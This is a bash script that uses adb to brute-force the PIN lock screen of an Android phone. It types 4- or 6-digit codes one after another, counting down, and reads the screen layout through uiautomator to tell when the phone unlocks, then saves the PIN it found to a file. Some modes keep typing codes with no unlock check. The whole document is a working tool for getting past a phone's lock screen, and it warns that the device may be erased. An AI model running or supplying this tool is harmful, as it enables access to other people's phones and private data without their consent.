#############################################
alias Button='./adbTouch.sh'
alias Text='adb shell input text '
alias ScreenOn='adb shell input keyevent 26'
alias Enter='adb shell input keyevent 66'
alias EnterPass='adb shell input keyevent 82'
#############################################
echo "#############################"
echo " Yours device can be erased  "
echo "#############################"
echo "\# You haven  been warned #/ "
echo " \#   Enter  to continue #/  "
echo "  \#   CTRL C for Exit  #/   "
echo "   \#    Your choice   #/    "
echo "    \#       is       #/     "
echo "     \#     here     #/      "
echo "      \#            #/       "
echo "       \#    ||    #/        "
echo "        \#   ||   #/         "
echo "         \#  ||  #/          "
echo "          \# \/ #/           "
echo "           \#  #/            "
echo "            \##/             "
echo ""
echo "            @@@@             "
echo "           @    @            "
echo "           @    @            "
echo "            @@@@             "
read z
echo "     You agree with risk     "
echo "        Lets rock it !       "

#Connected=$(adb devices |grep -m2 "device" |tail -n1|cut -c 10-16)

#while [ $Connected != "device" ] ;
#do
#clear
#echo "[ADB] Waiting for device... "
#sleep 2
#clear
#echo "[ADB] Waiting for device.."
#sleep 1
#clear 
#echo "[ADB] Waiting for device."
#sleep 1
#clear 
#Connected=$(adb devices |grep -m2 "device" |tail -n1|cut -c 10-16)
#done
#echo "[ADB] Connected !"

ScreenOn
echo "[ADB] Screen on"
EnterPass
echo "[ADB] Go to input"

echo "#####################################"
echo "[APC] How much digits is on screen ?"
echo "#####################################"
echo "  1) 4-Digits"
echo "  2) 6-Digits"
echo "  3) 4-Digits WUC  ( Without Unlock Check: good for custom roms) " 
echo "  4) 6-Digits WUC  ( Without Unlock Check: good for custom roms) "
echo "  5) Quit"

read selected
clear
case $selected in
  1)
	echo "[APC] selected 4-Digits mode"
	gen=9999
	EnterPass


if [ True ]
then
   while [ True ];
		do
		gen=$(($gen-1)) 
		echo "[APC] trying $gen"
		Text $gen
		Enter
                adb pull $(adb shell uiautomator dump | grep -oP '[^ ]+.xml') /tmp/view.xml >&-
		if cat /tmp/view.xml  |grep -q "Pin"
                then echo ""
                else 
                   echo "[APC] UNLOCKED with $gen !" 
                   touch  $gen.is.pin
                   adb shell "rm /sdcard/window_dump.xml" & rm /tmp/view.xml >&-
                   break
                fi

done
fi

	;;
  2) 
	echo "[APC] selected 6-Digits mode"
	gen=999999
	EnterPass

if [ True ]
then
   while [ True ];
                do
                gen=$(($gen-1)) 
		echo "[APC] Trying $gen"
                Text $gen
                Enter
		adb pull $(adb shell uiautomator dump | grep -oP '[^ ]+.xml') /tmp/view.xml >&-
		if cat /tmp/view.xml  |grep -q "Pin" 
                then echo ""
                else 
		   echo "[APC] UNLOCKED with $gen !" 
		   touch  $gen.is.pin
		   adb shell "rm /sdcard/window_dump.xml" & rm /tmp/view.xml >&-
	  	   break
                fi
 

done
fi  




	;;
  3)
	echo "[APC] selected 4-Digits WUC mode"
	gen=9999
	EnterPass


if [ True ]
then
   while [ True ];
		do
    echo "[APC] You must check screen yourself..."
		gen=$(($gen-1)) 
		echo "[APC] trying $gen"
		Text $gen
		Enter
    sleep 3
done
fi

	;;
  4) 
	echo "[APC] selected 6-Digits WUC mode"
	gen=999999
	EnterPass

if [ True ]
then
   while [ True ];
                do
                echo "[APC] You must check screen yourself..."
                gen=$(($gen-1)) 
		echo "[APC] Trying $gen"
                Text $gen
                Enter
                sleep 3
done
fi  


  ;;
  5)
    exit
	;;
  *) echo "[APC] invalid option"
   ./main.sh
	;;
esac
